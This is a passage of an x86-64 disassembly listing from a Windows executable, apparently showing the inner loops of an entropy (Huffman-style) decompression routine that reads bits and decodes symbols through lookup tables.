   140004a22:	4d 63 0c be          	movslq (%r14,%rdi,4),%r9
   140004a26:	4d 01 f1             	add    %r14,%r9
   140004a29:	41 ff e1             	jmp    *%r9
   140004a2c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004a30:	45 0f b6 48 0c       	movzbl 0xc(%r8),%r9d
   140004a35:	49 c1 e1 30          	shl    $0x30,%r9
   140004a39:	4c 01 ce             	add    %r9,%rsi
   140004a3c:	45 0f b6 48 0b       	movzbl 0xb(%r8),%r9d
   140004a41:	49 c1 e1 28          	shl    $0x28,%r9
   140004a45:	4c 01 ce             	add    %r9,%rsi
   140004a48:	45 0f b6 48 0a       	movzbl 0xa(%r8),%r9d
   140004a4d:	49 c1 e1 20          	shl    $0x20,%r9
   140004a51:	4c 01 ce             	add    %r9,%rsi
   140004a54:	45 0f b6 48 09       	movzbl 0x9(%r8),%r9d
   140004a59:	49 c1 e1 18          	shl    $0x18,%r9
   140004a5d:	4c 01 ce             	add    %r9,%rsi
   140004a60:	45 0f b6 48 08       	movzbl 0x8(%r8),%r9d
   140004a65:	49 c1 e1 10          	shl    $0x10,%r9
   140004a69:	4c 01 ce             	add    %r9,%rsi
   140004a6c:	45 0f b6 48 07       	movzbl 0x7(%r8),%r9d
   140004a71:	49 c1 e1 08          	shl    $0x8,%r9
   140004a75:	4c 01 ce             	add    %r9,%rsi
   140004a78:	84 d2                	test   %dl,%dl
   140004a7a:	0f 84 68 f8 ff ff    	je     0x1400042e8
   140004a80:	44 0f bd ca          	bsr    %edx,%r9d
   140004a84:	ba 09 00 00 00       	mov    $0x9,%edx
   140004a89:	4c 89 7c 24 18       	mov    %r15,0x18(%rsp)
   140004a8e:	44 29 ea             	sub    %r13d,%edx
   140004a91:	c1 e2 03             	shl    $0x3,%edx
   140004a94:	44 29 ca             	sub    %r9d,%edx
   140004a97:	e9 b2 f8 ff ff       	jmp    0x14000434e
   140004a9c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004aa0:	48 c7 c1 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rcx
   140004aa7:	e9 43 f8 ff ff       	jmp    0x1400042ef
   140004aac:	0f 1f 40 00          	nopl   0x0(%rax)
   140004ab0:	0f b6 3f             	movzbl (%rdi),%edi
   140004ab3:	66 41 83 fc 07       	cmp    $0x7,%r12w
   140004ab8:	77 7c                	ja     0x140004b36
   140004aba:	4c 8d 35 1f d7 01 00 	lea    0x1d71f(%rip),%r14        # 0x1400221e0
   140004ac1:	4d 63 2c ae          	movslq (%r14,%rbp,4),%r13
   140004ac5:	4d 01 f5             	add    %r14,%r13
   140004ac8:	41 ff e5             	jmp    *%r13
   140004acb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ad0:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004ad5:	45 0f b6 6e 06       	movzbl 0x6(%r14),%r13d
   140004ada:	49 c1 e5 30          	shl    $0x30,%r13
   140004ade:	4c 01 ef             	add    %r13,%rdi
   140004ae1:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004ae6:	45 0f b6 6e 05       	movzbl 0x5(%r14),%r13d
   140004aeb:	49 c1 e5 28          	shl    $0x28,%r13
   140004aef:	4c 01 ef             	add    %r13,%rdi
   140004af2:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004af7:	45 0f b6 6e 04       	movzbl 0x4(%r14),%r13d
   140004afc:	49 c1 e5 20          	shl    $0x20,%r13
   140004b00:	4c 01 ef             	add    %r13,%rdi
   140004b03:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004b08:	45 0f b6 6e 03       	movzbl 0x3(%r14),%r13d
   140004b0d:	49 c1 e5 18          	shl    $0x18,%r13
   140004b11:	4c 01 ef             	add    %r13,%rdi
   140004b14:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004b19:	45 0f b6 6e 02       	movzbl 0x2(%r14),%r13d
   140004b1e:	49 c1 e5 10          	shl    $0x10,%r13
   140004b22:	4c 01 ef             	add    %r13,%rdi
   140004b25:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004b2a:	45 0f b6 6e 01       	movzbl 0x1(%r14),%r13d
   140004b2f:	49 c1 e5 08          	shl    $0x8,%r13
   140004b33:	4c 01 ef             	add    %r13,%rdi
   140004b36:	45 84 c9             	test   %r9b,%r9b
   140004b39:	0f 84 a9 f7 ff ff    	je     0x1400042e8
   140004b3f:	41 bd 09 00 00 00    	mov    $0x9,%r13d
   140004b45:	45 0f bd c9          	bsr    %r9d,%r9d
   140004b49:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004b4e:	45 29 e5             	sub    %r12d,%r13d
   140004b51:	41 c1 e5 03          	shl    $0x3,%r13d
   140004b55:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140004b5a:	45 29 cd             	sub    %r9d,%r13d
   140004b5d:	e9 30 f8 ff ff       	jmp    0x140004392
   140004b62:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004b68:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140004b6f:	e9 7b f7 ff ff       	jmp    0x1400042ef
   140004b74:	0f 1f 40 00          	nopl   0x0(%rax)
   140004b78:	45 0f b6 36          	movzbl (%r14),%r14d
   140004b7c:	4c 89 34 24          	mov    %r14,(%rsp)
   140004b80:	66 83 fb 07          	cmp    $0x7,%bx
   140004b84:	77 7c                	ja     0x140004c02
   140004b86:	4c 8d 25 73 d6 01 00 	lea    0x1d673(%rip),%r12        # 0x140022200
   140004b8d:	4b 63 2c 9c          	movslq (%r12,%r11,4),%rbp
   140004b91:	4c 01 e5             	add    %r12,%rbp
   140004b94:	ff e5                	jmp    *%rbp
   140004b96:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140004b9b:	41 0f b6 6e 06       	movzbl 0x6(%r14),%ebp
   140004ba0:	48 c1 e5 30          	shl    $0x30,%rbp
   140004ba4:	48 01 2c 24          	add    %rbp,(%rsp)
   140004ba8:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140004bad:	41 0f b6 6e 05       	movzbl 0x5(%r14),%ebp
   140004bb2:	48 c1 e5 28          	shl    $0x28,%rbp
   140004bb6:	48 01 2c 24          	add    %rbp,(%rsp)
   140004bba:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140004bbf:	41 0f b6 6e 04       	movzbl 0x4(%r14),%ebp
   140004bc4:	48 c1 e5 20          	shl    $0x20,%rbp
   140004bc8:	48 01 2c 24          	add    %rbp,(%rsp)
   140004bcc:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140004bd1:	41 0f b6 6e 03       	movzbl 0x3(%r14),%ebp
   140004bd6:	48 c1 e5 18          	shl    $0x18,%rbp
   140004bda:	48 01 2c 24          	add    %rbp,(%rsp)
   140004bde:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140004be3:	41 0f b6 6e 02       	movzbl 0x2(%r14),%ebp
   140004be8:	48 c1 e5 10          	shl    $0x10,%rbp
   140004bec:	48 01 2c 24          	add    %rbp,(%rsp)
   140004bf0:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140004bf5:	41 0f b6 6e 01       	movzbl 0x1(%r14),%ebp
   140004bfa:	48 c1 e5 08          	shl    $0x8,%rbp
   140004bfe:	48 01 2c 24          	add    %rbp,(%rsp)
   140004c02:	45 84 c9             	test   %r9b,%r9b
   140004c05:	0f 84 dd f6 ff ff    	je     0x1400042e8
   140004c0b:	bd 09 00 00 00       	mov    $0x9,%ebp
   140004c10:	45 0f bd c9          	bsr    %r9d,%r9d
   140004c14:	29 dd                	sub    %ebx,%ebp
   140004c16:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140004c1b:	c1 e5 03             	shl    $0x3,%ebp
   140004c1e:	44 29 cd             	sub    %r9d,%ebp
   140004c21:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004c26:	41 89 ec             	mov    %ebp,%r12d
   140004c29:	e9 b3 f7 ff ff       	jmp    0x1400043e1
   140004c2e:	66 90                	xchg   %ax,%ax
   140004c30:	4c 8d 1d e9 d5 01 00 	lea    0x1d5e9(%rip),%r11        # 0x140022220
   140004c37:	0f b6 2b             	movzbl (%rbx),%ebp
   140004c3a:	4d 63 14 8b          	movslq (%r11,%rcx,4),%r10
   140004c3e:	4d 01 da             	add    %r11,%r10
   140004c41:	41 ff e2             	jmp    *%r10
   140004c44:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004c49:	44 0f b6 53 06       	movzbl 0x6(%rbx),%r10d
   140004c4e:	49 c1 e2 30          	shl    $0x30,%r10
   140004c52:	4c 01 d5             	add    %r10,%rbp
   140004c55:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004c5a:	44 0f b6 53 05       	movzbl 0x5(%rbx),%r10d
   140004c5f:	49 c1 e2 28          	shl    $0x28,%r10
   140004c63:	4c 01 d5             	add    %r10,%rbp
   140004c66:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004c6b:	44 0f b6 53 04       	movzbl 0x4(%rbx),%r10d
   140004c70:	49 c1 e2 20          	shl    $0x20,%r10
   140004c74:	4c 01 d5             	add    %r10,%rbp
   140004c77:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004c7c:	44 0f b6 53 03       	movzbl 0x3(%rbx),%r10d
   140004c81:	49 c1 e2 18          	shl    $0x18,%r10
   140004c85:	4c 01 d5             	add    %r10,%rbp
   140004c88:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004c8d:	44 0f b6 53 02       	movzbl 0x2(%rbx),%r10d
   140004c92:	49 c1 e2 10          	shl    $0x10,%r10
   140004c96:	4c 01 d5             	add    %r10,%rbp
   140004c99:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004c9e:	44 0f b6 53 01       	movzbl 0x1(%rbx),%r10d
   140004ca3:	49 c1 e2 08          	shl    $0x8,%r10
   140004ca7:	4c 01 d5             	add    %r10,%rbp
   140004caa:	45 84 c9             	test   %r9b,%r9b
   140004cad:	0f 84 35 f6 ff ff    	je     0x1400042e8
   140004cb3:	41 ba 09 00 00 00    	mov    $0x9,%r10d
   140004cb9:	45 0f bd c9          	bsr    %r9d,%r9d
   140004cbd:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004cc2:	41 29 ca             	sub    %ecx,%r10d
   140004cc5:	41 c1 e2 03          	shl    $0x3,%r10d
   140004cc9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140004cce:	45 89 d6             	mov    %r10d,%r14d
   140004cd1:	45 29 ce             	sub    %r9d,%r14d
   140004cd4:	e9 67 f7 ff ff       	jmp    0x140004440
   140004cd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004ce0:	4c 89 4c 24 18       	mov    %r9,0x18(%rsp)
   140004ce5:	4c 8b 4c 24 08       	mov    0x8(%rsp),%r9
   140004cea:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140004cef:	48 39 c3             	cmp    %rax,%rbx
   140004cf2:	72 7f                	jb     0x140004d73
   140004cf4:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140004cf8:	4c 89 7c 24 08       	mov    %r15,0x8(%rsp)
   140004cfd:	f7 d9                	neg    %ecx
   140004cff:	83 e1 3f             	and    $0x3f,%ecx
   140004d02:	41 89 c8             	mov    %ecx,%r8d
   140004d05:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004d0c:	00 00 00 00 
   140004d10:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004d17:	00 00 00 00 
   140004d1b:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004d22:	00 00 00 00 
   140004d26:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004d2d:	00 00 00 00 
   140004d31:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004d38:	00 00 00 00 
   140004d3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004d40:	89 d1                	mov    %edx,%ecx
   140004d42:	49 89 f7             	mov    %rsi,%r15
   140004d45:	49 d3 e7             	shl    %cl,%r15
   140004d48:	44 89 c1             	mov    %r8d,%ecx
   140004d4b:	49 d3 ef             	shr    %cl,%r15
   140004d4e:	4b 8d 0c bb          	lea    (%r11,%r15,4),%rcx
   140004d52:	44 0f b7 39          	movzwl (%rcx),%r15d
   140004d56:	66 44 89 38          	mov    %r15w,(%rax)
   140004d5a:	44 0f b6 79 02       	movzbl 0x2(%rcx),%r15d
   140004d5f:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004d63:	44 01 fa             	add    %r15d,%edx
   140004d66:	48 01 c8             	add    %rcx,%rax
   140004d69:	48 39 c3             	cmp    %rax,%rbx
   140004d6c:	73 d2                	jae    0x140004d40
   140004d6e:	4c 8b 7c 24 08       	mov    0x8(%rsp),%r15
   140004d73:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   140004d7a:	00 
   140004d7b:	48 39 d8             	cmp    %rbx,%rax
   140004d7e:	73 36                	jae    0x140004db6
   140004d80:	89 d1                	mov    %edx,%ecx
   140004d82:	48 d3 e6             	shl    %cl,%rsi
   140004d85:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140004d89:	f7 d9                	neg    %ecx
   140004d8b:	48 d3 ee             	shr    %cl,%rsi
   140004d8e:	49 8d 0c b3          	lea    (%r11,%rsi,4),%rcx
   140004d92:	0f b6 19             	movzbl (%rcx),%ebx
   140004d95:	88 18                	mov    %bl,(%rax)
   140004d97:	80 79 03 01          	cmpb   $0x1,0x3(%rcx)
   140004d9b:	0f 84 4b 0b 00 00    	je     0x1400058ec
   140004da1:	83 fa 3f             	cmp    $0x3f,%edx
   140004da4:	77 10                	ja     0x140004db6
   140004da6:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   140004daa:	01 c2                	add    %eax,%edx
   140004dac:	b8 40 00 00 00       	mov    $0x40,%eax
   140004db1:	39 c2                	cmp    %eax,%edx
   140004db3:	0f 47 d0             	cmova  %eax,%edx
   140004db6:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140004dbd:	00 
   140004dbe:	48 8d 70 fe          	lea    -0x2(%rax),%rsi
   140004dc2:	41 83 fd 40          	cmp    $0x40,%r13d
   140004dc6:	0f 87 5a 01 00 00    	ja     0x140004f26
   140004dcc:	48 83 e8 07          	sub    $0x7,%rax
   140004dd0:	89 54 24 08          	mov    %edx,0x8(%rsp)
   140004dd4:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140004dd9:	48 89 44 24 10       	mov    %rax,0x10(%rsp)
   140004dde:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   140004de2:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140004de7:	f7 d8                	neg    %eax
   140004de9:	83 e0 3f             	and    $0x3f,%eax
   140004dec:	e9 f3 00 00 00       	jmp    0x140004ee4
   140004df1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004df8:	48 39 54 24 20       	cmp    %rdx,0x20(%rsp)
   140004dfd:	0f 84 7d 0a 00 00    	je     0x140005880
   140004e03:	44 89 ef             	mov    %r13d,%edi
   140004e06:	48 89 d1             	mov    %rdx,%rcx
   140004e09:	c1 ef 03             	shr    $0x3,%edi
   140004e0c:	89 fb                	mov    %edi,%ebx
   140004e0e:	48 29 d9             	sub    %rbx,%rcx
   140004e11:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140004e16:	48 39 d9             	cmp    %rbx,%rcx
   140004e19:	0f 82 21 08 00 00    	jb     0x140005640
   140004e1f:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140004e24:	48 89 ca             	mov    %rcx,%rdx
   140004e27:	49 39 d8             	cmp    %rbx,%r8
   140004e2a:	0f 92 c3             	setb   %bl
   140004e2d:	c1 e7 03             	shl    $0x3,%edi
   140004e30:	41 29 fd             	sub    %edi,%r13d
   140004e33:	48 8b 39             	mov    (%rcx),%rdi
   140004e36:	84 db                	test   %bl,%bl
   140004e38:	0f 84 c7 0a 00 00    	je     0x140005905
   140004e3e:	44 89 e9             	mov    %r13d,%ecx
   140004e41:	48 89 fb             	mov    %rdi,%rbx
   140004e44:	48 d3 e3             	shl    %cl,%rbx
   140004e47:	89 c1                	mov    %eax,%ecx
   140004e49:	48 d3 eb             	shr    %cl,%rbx
   140004e4c:	49 8d 0c 9b          	lea    (%r11,%rbx,4),%rcx
   140004e50:	0f b7 19             	movzwl (%rcx),%ebx
   140004e53:	66 41 89 18          	mov    %bx,(%r8)
   140004e57:	0f b6 59 02          	movzbl 0x2(%rcx),%ebx
   140004e5b:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004e5f:	41 01 dd             	add    %ebx,%r13d
   140004e62:	48 89 fb             	mov    %rdi,%rbx
   140004e65:	49 01 c8             	add    %rcx,%r8
   140004e68:	44 89 e9             	mov    %r13d,%ecx
   140004e6b:	48 d3 e3             	shl    %cl,%rbx
   140004e6e:	89 c1                	mov    %eax,%ecx
   140004e70:	48 d3 eb             	shr    %cl,%rbx
   140004e73:	49 8d 0c 9b          	lea    (%r11,%rbx,4),%rcx
   140004e77:	0f b7 19             	movzwl (%rcx),%ebx
   140004e7a:	66 41 89 18          	mov    %bx,(%r8)
   140004e7e:	0f b6 59 02          	movzbl 0x2(%rcx),%ebx
   140004e82:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004e86:	44 01 eb             	add    %r13d,%ebx
   140004e89:	49 89 fd             	mov    %rdi,%r13
   140004e8c:	49 01 c8             	add    %rcx,%r8
   140004e8f:	89 d9                	mov    %ebx,%ecx
   140004e91:	49 d3 e5             	shl    %cl,%r13
   140004e94:	89 c1                	mov    %eax,%ecx
   140004e96:	49 d3 ed             	shr    %cl,%r13
   140004e99:	4b 8d 0c ab          	lea    (%r11,%r13,4),%rcx
   140004e9d:	44 0f b7 29          	movzwl (%rcx),%r13d
   140004ea1:	66 45 89 28          	mov    %r13w,(%r8)
   140004ea5:	44 0f b6 69 02       	movzbl 0x2(%rcx),%r13d
   140004eaa:	41 01 dd             	add    %ebx,%r13d
   140004ead:	0f b6 59 03          	movzbl 0x3(%rcx),%ebx
   140004eb1:	44 89 e9             	mov    %r13d,%ecx
   140004eb4:	4c 01 c3             	add    %r8,%rbx
   140004eb7:	49 89 f8             	mov    %rdi,%r8
   140004eba:	49 d3 e0             	shl    %cl,%r8
   140004ebd:	89 c1                	mov    %eax,%ecx
   140004ebf:	49 d3 e8             	shr    %cl,%r8
   140004ec2:	4b 8d 0c 83          	lea    (%r11,%r8,4),%rcx
   140004ec6:	44 0f b7 01          	movzwl (%rcx),%r8d
   140004eca:	66 44 89 03          	mov    %r8w,(%rbx)
   140004ece:	44 0f b6 41 02       	movzbl 0x2(%rcx),%r8d
   140004ed3:	45 01 c5             	add    %r8d,%r13d
   140004ed6:	44 0f b6 41 03       	movzbl 0x3(%rcx),%r8d
   140004edb:	49 01 d8             	add    %rbx,%r8
   140004ede:	41 83 fd 40          	cmp    $0x40,%r13d
   140004ee2:	77 34                	ja     0x140004f18
   140004ee4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004ee9:	48 39 da             	cmp    %rbx,%rdx
   140004eec:	0f 82 06 ff ff ff    	jb     0x140004df8
   140004ef2:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140004ef7:	44 89 e9             	mov    %r13d,%ecx
   140004efa:	41 83 e5 07          	and    $0x7,%r13d
   140004efe:	c1 e9 03             	shr    $0x3,%ecx
   140004f01:	48 29 ca             	sub    %rcx,%rdx
   140004f04:	49 39 d8             	cmp    %rbx,%r8
   140004f07:	48 8b 3a             	mov    (%rdx),%rdi
   140004f0a:	0f 92 c3             	setb   %bl
   140004f0d:	e9 24 ff ff ff       	jmp    0x140004e36
   140004f12:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004f18:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140004f1d:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140004f22:	8b 54 24 08          	mov    0x8(%rsp),%edx
   140004f26:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004f2b:	48 39 c6             	cmp    %rax,%rsi
   140004f2e:	72 43                	jb     0x140004f73
   140004f30:	8b 5c 24 7c          	mov    0x7c(%rsp),%ebx
   140004f34:	f7 db                	neg    %ebx
   140004f36:	83 e3 3f             	and    $0x3f,%ebx
   140004f39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004f40:	44 89 e9             	mov    %r13d,%ecx
   140004f43:	49 89 f8             	mov    %rdi,%r8
   140004f46:	49 d3 e0             	shl    %cl,%r8
   140004f49:	89 d9                	mov    %ebx,%ecx
   140004f4b:	49 d3 e8             	shr    %cl,%r8
   140004f4e:	4b 8d 0c 83          	lea    (%r11,%r8,4),%rcx
   140004f52:	44 0f b7 01          	movzwl (%rcx),%r8d
   140004f56:	66 44 89 00          	mov    %r8w,(%rax)
   140004f5a:	44 0f b6 41 02       	movzbl 0x2(%rcx),%r8d
   140004f5f:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004f63:	45 01 c5             	add    %r8d,%r13d
   140004f66:	48 01 c8             	add    %rcx,%rax
   140004f69:	48 39 c6             	cmp    %rax,%rsi
   140004f6c:	73 d2                	jae    0x140004f40
   140004f6e:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140004f73:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140004f78:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140004f7f:	00 
   140004f80:	48 39 c3             	cmp    %rax,%rbx
   140004f83:	73 3b                	jae    0x140004fc0
   140004f85:	44 89 e9             	mov    %r13d,%ecx
   140004f88:	48 d3 e7             	shl    %cl,%rdi
   140004f8b:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140004f8f:	f7 d9                	neg    %ecx
   140004f91:	48 d3 ef             	shr    %cl,%rdi
   140004f94:	49 8d 04 bb          	lea    (%r11,%rdi,4),%rax
   140004f98:	0f b6 08             	movzbl (%rax),%ecx
   140004f9b:	88 0b                	mov    %cl,(%rbx)
   140004f9d:	80 78 03 01          	cmpb   $0x1,0x3(%rax)
   140004fa1:	0f 84 39 09 00 00    	je     0x1400058e0
   140004fa7:	41 83 fd 3f          	cmp    $0x3f,%r13d
   140004fab:	77 13                	ja     0x140004fc0
   140004fad:	0f b6 40 02          	movzbl 0x2(%rax),%eax
   140004fb1:	41 01 c5             	add    %eax,%r13d
   140004fb4:	b8 40 00 00 00       	mov    $0x40,%eax
   140004fb9:	41 39 c5             	cmp    %eax,%r13d
   140004fbc:	44 0f 47 e8          	cmova  %eax,%r13d
   140004fc0:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140004fc7:	00 
   140004fc8:	48 8d 70 fe          	lea    -0x2(%rax),%rsi
   140004fcc:	41 83 fc 40          	cmp    $0x40,%r12d
   140004fd0:	0f 87 53 01 00 00    	ja     0x140005129
   140004fd6:	44 8b 44 24 7c       	mov    0x7c(%rsp),%r8d
   140004fdb:	48 8d 78 f9          	lea    -0x7(%rax),%rdi
   140004fdf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004fe4:	48 8b 04 24          	mov    (%rsp),%rax
   140004fe8:	48 89 3c 24          	mov    %rdi,(%rsp)
   140004fec:	41 f7 d8             	neg    %r8d
   140004fef:	41 83 e0 3f          	and    $0x3f,%r8d
   140004ff3:	e9 f9 00 00 00       	jmp    0x1400050f1
   140004ff8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004fff:	00 
   140005000:	48 39 5c 24 38       	cmp    %rbx,0x38(%rsp)
   140005005:	0f 84 55 08 00 00    	je     0x140005860
   14000500b:	44 89 e0             	mov    %r12d,%eax
   14000500e:	48 89 d9             	mov    %rbx,%rcx
   140005011:	c1 e8 03             	shr    $0x3,%eax
   140005014:	89 c7                	mov    %eax,%edi
   140005016:	48 29 f9             	sub    %rdi,%rcx
   140005019:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000501e:	48 39 f9             	cmp    %rdi,%rcx
   140005021:	0f 82 01 04 00 00    	jb     0x140005428
   140005027:	48 8b 1c 24          	mov    (%rsp),%rbx
   14000502b:	49 39 da             	cmp    %rbx,%r10
   14000502e:	48 89 cb             	mov    %rcx,%rbx
   140005031:	40 0f 92 c7          	setb   %dil
   140005035:	c1 e0 03             	shl    $0x3,%eax
   140005038:	41 29 c4             	sub    %eax,%r12d
   14000503b:	48 8b 01             	mov    (%rcx),%rax
   14000503e:	40 84 ff             	test   %dil,%dil
   140005041:	0f 84 b0 08 00 00    	je     0x1400058f7
   140005047:	44 89 e1             	mov    %r12d,%ecx
   14000504a:	48 89 c7             	mov    %rax,%rdi
   14000504d:	48 d3 e7             	shl    %cl,%rdi
   140005050:	44 89 c1             	mov    %r8d,%ecx
   140005053:	48 d3 ef             	shr    %cl,%rdi
   140005056:	49 8d 0c bb          	lea    (%r11,%rdi,4),%rcx
   14000505a:	0f b7 39             	movzwl (%rcx),%edi
   14000505d:	66 41 89 3a          	mov    %di,(%r10)
   140005061:	0f b6 79 02          	movzbl 0x2(%rcx),%edi
   140005065:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140005069:	41 01 fc             	add    %edi,%r12d
   14000506c:	48 89 c7             	mov    %rax,%rdi
   14000506f:	49 01 ca             	add    %rcx,%r10
   140005072:	44 89 e1             	mov    %r12d,%ecx
   140005075:	48 d3 e7             	shl    %cl,%rdi
   140005078:	44 89 c1             	mov    %r8d,%ecx
   14000507b:	48 d3 ef             	shr    %cl,%rdi
   14000507e:	49 8d 0c bb          	lea    (%r11,%rdi,4),%rcx
   140005082:	0f b7 39             	movzwl (%rcx),%edi
   140005085:	66 41 89 3a          	mov    %di,(%r10)
   140005089:	0f b6 79 02          	movzbl 0x2(%rcx),%edi
   14000508d:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140005091:	44 01 e7             	add    %r12d,%edi
   140005094:	49 89 c4             	mov    %rax,%r12
   140005097:	49 01 ca             	add    %rcx,%r10
   14000509a:	89 f9                	mov    %edi,%ecx
   14000509c:	49 d3 e4             	shl    %cl,%r12
   14000509f:	44 89 c1             	mov    %r8d,%ecx
   1400050a2:	49 d3 ec             	shr    %cl,%r12
   1400050a5:	4b 8d 0c a3          	lea    (%r11,%r12,4),%rcx
   1400050a9:	44 0f b7 21          	movzwl (%rcx),%r12d
   1400050ad:	66 45 89 22          	mov    %r12w,(%r10)
   1400050b1:	44 0f b6 61 02       	movzbl 0x2(%rcx),%r12d
   1400050b6:	41 01 fc             	add    %edi,%r12d
   1400050b9:	0f b6 79 03          	movzbl 0x3(%rcx),%edi
   1400050bd:	44 89 e1             	mov    %r12d,%ecx
   1400050c0:	4c 01 d7             	add    %r10,%rdi
   1400050c3:	49 89 c2             	mov    %rax,%r10
   1400050c6:	49 d3 e2             	shl    %cl,%r10
   1400050c9:	44 89 c1             	mov    %r8d,%ecx
   1400050cc:	49 d3 ea             	shr    %cl,%r10
   1400050cf:	4b 8d 0c 93          	lea    (%r11,%r10,4),%rcx
   1400050d3:	44 0f b7 11          	movzwl (%rcx),%r10d
   1400050d7:	66 44 89 17          	mov    %r10w,(%rdi)
   1400050db:	44 0f b6 51 02       	movzbl 0x2(%rcx),%r10d
   1400050e0:	45 01 d4             	add    %r10d,%r12d
   1400050e3:	44 0f b6 51 03       	movzbl 0x3(%rcx),%r10d
   1400050e8:	49 01 fa             	add    %rdi,%r10
   1400050eb:	41 83 fc 40          	cmp    $0x40,%r12d
   1400050ef:	77 2f                	ja     0x140005120
   1400050f1:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400050f6:	48 39 fb             	cmp    %rdi,%rbx
   1400050f9:	0f 82 01 ff ff ff    	jb     0x140005000
   1400050ff:	48 8b 3c 24          	mov    (%rsp),%rdi
   140005103:	44 89 e0             	mov    %r12d,%eax
   140005106:	41 83 e4 07          	and    $0x7,%r12d
   14000510a:	c1 e8 03             	shr    $0x3,%eax
   14000510d:	48 29 c3             	sub    %rax,%rbx
   140005110:	49 39 fa             	cmp    %rdi,%r10
   140005113:	48 8b 03             	mov    (%rbx),%rax
   140005116:	40 0f 92 c7          	setb   %dil
   14000511a:	e9 1f ff ff ff       	jmp    0x14000503e
   14000511f:	90                   	nop
   140005120:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005125:	48 89 04 24          	mov    %rax,(%rsp)
   140005129:	4c 39 d6             	cmp    %r10,%rsi
   14000512c:	72 3f                	jb     0x14000516d
   14000512e:	44 8b 44 24 7c       	mov    0x7c(%rsp),%r8d
   140005133:	48 8b 1c 24          	mov    (%rsp),%rbx
   140005137:	41 f7 d8             	neg    %r8d
   14000513a:	41 83 e0 3f          	and    $0x3f,%r8d
   14000513e:	66 90                	xchg   %ax,%ax
   140005140:	44 89 e1             	mov    %r12d,%ecx
   140005143:	48 89 d8             	mov    %rbx,%rax
   140005146:	48 d3 e0             	shl    %cl,%rax
   140005149:	44 89 c1             	mov    %r8d,%ecx
   14000514c:	48 d3 e8             	shr    %cl,%rax
   14000514f:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140005153:	0f b7 08             	movzwl (%rax),%ecx
   140005156:	66 41 89 0a          	mov    %cx,(%r10)
   14000515a:	0f b6 48 02          	movzbl 0x2(%rax),%ecx
